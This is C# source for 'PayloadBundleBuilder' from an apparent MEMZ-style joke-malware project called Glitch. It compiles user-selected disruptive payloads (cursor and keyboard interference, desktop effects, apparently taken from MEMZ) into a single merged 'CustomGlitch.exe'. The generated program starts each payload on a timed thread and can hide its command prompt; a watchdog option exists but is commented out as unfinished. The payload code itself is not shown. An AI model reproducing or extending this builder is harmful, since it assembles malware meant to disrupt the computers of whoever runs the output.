using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Threading;
using GlitchPayloads;
using ILRepacking;
using Misc;

namespace Glitch
{
    public static class PayloadBundleBuilder
    {
        public static void Build(string[] payloads)
        {
            bool showNp = payloads.Contains("np");
            bool hideCmd = payloads.Contains("hd");
            bool runWds = payloads.Contains("wd");
            bool skipDelay = payloads.Contains("sd");
            if (showNp)
                Console.WriteLine("Showing Notepad");
            if (hideCmd)
                Console.WriteLine("Hiding command prompt");
            if (runWds)
                Console.WriteLine("Using watchdogs");
            if (skipDelay)
                Console.WriteLine("Skipping delays");
            Console.WriteLine("Using payloads:");
            List<Tuple<MethodInfo, int, int>> mpayloads = new List<Tuple<MethodInfo, int, int>>();
            List<Tuple<MethodInfo, int>> mpayloads2 = new List<Tuple<MethodInfo, int>>();
            Program.payloads.Where(s => payloads.Any(a =>
                    string.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
                .ForEach(
                    s =>
                    {
                        Console.WriteLine($"- {s.Item2.Name}");
                        mpayloads.Add(new Tuple<MethodInfo, int, int>(s.Item1, s.Item2.RunAfter, s.Item2.DefaultDelay));
                    });
            Console.WriteLine($"{Environment.NewLine}Self-Hosted:{Environment.NewLine}");
            Program.selfHostedPayloads.Where(s => payloads.Any(a =>
                    string.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
                .ForEach(
                    s =>
                    {
                        Console.WriteLine($"- {s.Item2.Name}");
                        mpayloads2.Add(new Tuple<MethodInfo, int>(s.Item1, s.Item2.RunAfter));
                    });
            Console.WriteLine("Your binary will be saved as \"CustomGlitch.exe\"");
            AssemblyName aName = new AssemblyName("CustomGlitch");
            AssemblyBuilder ab = AssemblyBuilder.DefineDynamicAssembly(aName, AssemblyBuilderAccess.Save);
            ModuleBuilder mb = ab.DefineDynamicModule(aName.Name, aName.Name + ".exe");
            TypeBuilder tb = mb.DefineType("Program", TypeAttributes.Public);
            MethodBuilder entry =
                tb.DefineMethod("Main", MethodAttributes.Public | MethodAttributes.Static, null, null);
            ab.SetEntryPoint(entry);
            ILGenerator il = entry.GetILGenerator();
            il.Emit(OpCodes.Nop);
            il.EmitWriteLine($"Running Glitch Payload Bundle... (Config: {string.Join(", ", payloads)})");
            if (showNp)
            {
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("ShowNotepad"), null);
                il.Emit(OpCodes.Nop);
            }
            foreach (Tuple<MethodInfo, int, int> method in mpayloads)
            {
                il.Emit(OpCodes.Ldnull);
                il.Emit(OpCodes.Ldftn, method.Item1);
                il.Emit(OpCodes.Newobj, typeof(Action).GetConstructors()[0]);
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("GetMethodInfo"), null);
                il.Emit(OpCodes.Ldc_I4, skipDelay ? 0 : method.Item2);
                il.Emit(OpCodes.Ldc_I4, method.Item3);
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("GetRunner"), null);
                il.EmitCall(OpCodes.Callvirt, typeof(Thread).GetMethod("Start", new Type[0]), null);
                il.Emit(OpCodes.Nop);
            }
            foreach (Tuple<MethodInfo, int> method in mpayloads2)
            {
                il.Emit(OpCodes.Ldnull);
                il.Emit(OpCodes.Ldftn, method.Item1);
                il.Emit(OpCodes.Newobj, typeof(Action).GetConstructors()[0]);
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("GetMethodInfo"), null);
                il.Emit(OpCodes.Ldc_I4, skipDelay ? 0 : method.Item2);
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("GetSelfHostedRunner"), null);
                il.EmitCall(OpCodes.Callvirt, typeof(Thread).GetMethod("Start", new Type[0]), null);
                il.Emit(OpCodes.Nop);
            }
            il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("LaunchIncrementor"), null);
            il.Emit(OpCodes.Nop);
            if (hideCmd)
            {
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("HideCmd"), null);
                il.Emit(OpCodes.Nop);
            }
            /* TODO fix WDs (Check if should run as WD, might require some extra work for the entry point)
            if (runWds)
            {
                il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("RunWDs"), null);
                il.Emit(OpCodes.Nop);
            }*/
            il.Emit(OpCodes.Ret);
            tb.CreateType();
            ab.Save(aName.Name + ".exe");
            Assembly asm = Assembly.Load(File.ReadAllBytes("CustomGlitch.exe"));
            ILRepack repack = new ILRepack(new RepackOptions(new[]{"/out:CustomGlitch.merged.exe", "CustomGlitch.exe"}.Concat(GetDependentFilesPass(asm, Environment.CurrentDirectory))));
            repack.Repack();
            File.Delete("CustomGlitch.exe");
            File.Move("CustomGlitch.merged.exe", "CustomGlitch.exe");
        }
        
        private static string[] GetDependentFilesPass(Assembly assembly, string poe)
        {
            return CollectDeps(assembly, poe).Select(s => Path.GetFullPath($"{s.Name}.dll")).Where(File.Exists)
                .ToArray();
        }

        private static AssemblyName[] CollectDeps(Assembly assembly, string poe)
        {
            List<AssemblyName> tmp = assembly.GetReferencedAssemblies().ToList();
            int i = 0;
            while (i < tmp.Count())
            {
                Assembly tmp1 = Assembly.Load(tmp[i]);
                tmp.AddRange(tmp1.GetReferencedAssemblies().Where(s => Path.GetFullPath(s.Name).StartsWith(poe) && !tmp.Any(a => a.Name == s.Name)));
                i++;
            }
            return tmp.ToArray();
        }

        public static void ILTest() // used for finding IL code using the IDE-integrated IL-Viewer
        {
            StandardCommands.ShowNotepad();
            StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadCursor), 15000, 47).Start();
            StandardCommands.GetRunner(StandardCommands.GetMethodInfo(Memz.PayloadKeyboard), 25, 35).Start();
            StandardCommands.GetSelfHostedRunner(StandardCommands.GetMethodInfo(Broadcast.PayloadDesktopEyes), 666)
                .Start();
            StandardCommands.LaunchIncrementor();
            StandardCommands.HideCmd();
            StandardCommands.RunWDs();
        }
    }
}